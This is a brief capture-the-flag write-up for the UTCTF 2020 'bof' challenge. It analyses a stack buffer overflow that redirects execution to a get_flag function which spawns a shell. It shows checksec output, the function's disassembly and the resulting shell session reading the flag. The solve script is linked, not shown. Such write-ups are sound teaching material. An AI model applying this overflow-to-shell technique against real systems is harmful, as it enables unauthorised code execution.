[](ctf=utctf-2020)
[](type=pwn)
[](tags=buffer-overflow)
[](tools=gdb,python)

# bof

We are given an `x86_64` [binary](../pwnable) with a simple stack based buffer overflow.
The binary is compiled with `NX` enabled.

```sh
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```

There is a function `get_flag` which spawns a shell if given `0xdeadbeef` as an
argument in `rdi`.

```asm
gdb-peda$ disass get_flag 
Dump of assembler code for function get_flag:
   0x00000000004005ea <+0>:     push   rbp
   0x00000000004005eb <+1>:     mov    rbp,rsp
   0x00000000004005ee <+4>:     sub    rsp,0x20
   0x00000000004005f2 <+8>:     mov    DWORD PTR [rbp-0x14],edi
   0x00000000004005f5 <+11>:    cmp    DWORD PTR [rbp-0x14],0xdeadbeef
   0x00000000004005fc <+18>:    jne    0x400628 <get_flag+62>
   0x00000000004005fe <+20>:    mov    QWORD PTR [rbp-0x10],0x400700
   0x0000000000400606 <+28>:    mov    QWORD PTR [rbp-0x8],0x0
   0x000000000040060e <+36>:    mov    rax,QWORD PTR [rbp-0x10]
   0x0000000000400612 <+40>:    lea    rcx,[rbp-0x10]
   0x0000000000400616 <+44>:    mov    edx,0x0
   0x000000000040061b <+49>:    mov    rsi,rcx
   0x000000000040061e <+52>:    mov    rdi,rax
   0x0000000000400621 <+55>:    call   0x400490 <execve@plt>
   0x0000000000400626 <+60>:    jmp    0x400629 <get_flag+63>
   0x0000000000400628 <+62>:    nop
   0x0000000000400629 <+63>:    leave  
   0x000000000040062a <+64>:    ret 
```

Solution script is present [here](./solve.py).

```sh
$ python solve.py 
I really like strings! Please give me a good one!
Thanks for the string
ls
flag.txt
cat flag.txt
utflag{thanks_for_the_string_!!!!!!}
```
